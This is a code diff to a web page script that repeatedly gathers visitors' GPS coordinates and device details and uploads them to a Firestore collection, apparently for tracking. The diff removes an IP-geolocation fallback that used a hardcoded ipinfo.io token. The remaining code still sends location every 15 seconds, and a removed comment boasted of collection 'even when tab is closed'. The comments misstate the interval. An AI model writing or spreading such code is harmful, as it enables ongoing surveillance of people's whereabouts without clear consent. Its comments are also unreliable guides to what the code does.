@@ -79,37 +79,6 @@
             }
         }
 
-        // ✅ Get IP Location
-        function getIPLocation(callback) {
-            fetch('https://ipinfo.io/json?token=6a9008bb55fd89')
-                .then(response => response.json())
-                .then(data => {
-                    callback({
-                        ip: data.ip,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country,
-                        latitude: data.loc.split(",")[0],
-                        longitude: data.loc.split(",")[1],
-                        timestamp: getISTTime(),
-                        type: "IP",
-                        device: getDeviceInfo()
-                    });
-                })
-                .catch(() => callback(null));
-        }
-
-        // ✅ Save to Firestore
-        async function saveToFirestore(data) {
-            try {
-                await addDoc(collection(db, "user_data"), data);
-                console.log("✅ Location Data Sent:", data);
-            } catch (error) {
-                console.error("❌ Error Saving Data:", error);
-                saveToIndexedDB(data);
-            }
-        }
-
         // ✅ Save Data to IndexedDB
         function saveToIndexedDB(data) {
             let request = indexedDB.open("LocationDB", 1);
@@ -128,20 +97,27 @@
             };
         }
 
+        // ✅ Save to Firestore
+        async function saveToFirestore(data) {
+            try {
+                await addDoc(collection(db, "user_data"), data);
+                console.log("✅ Location Data Sent:", data);
+            } catch (error) {
+                console.error("❌ Error Saving Data:", error);
+                saveToIndexedDB(data);
+            }
+        }
+
         // ✅ Collect Location
         function collectLocation() {
             getGPSLocation((gpsData) => {
                 if (gpsData) {
                     saveToFirestore(gpsData);
-                } else {
-                    getIPLocation((ipData) => {
-                        if (ipData) saveToFirestore(ipData);
-                    });
                 }
             });
         }
 
-        // ✅ Send Data Every 60 Seconds (Even When Tab is Closed)
+        // ✅ Start Collecting Data Every 30 Seconds
         setInterval(collectLocation, 15000);
 
         // ✅ Send Data When Page Opens
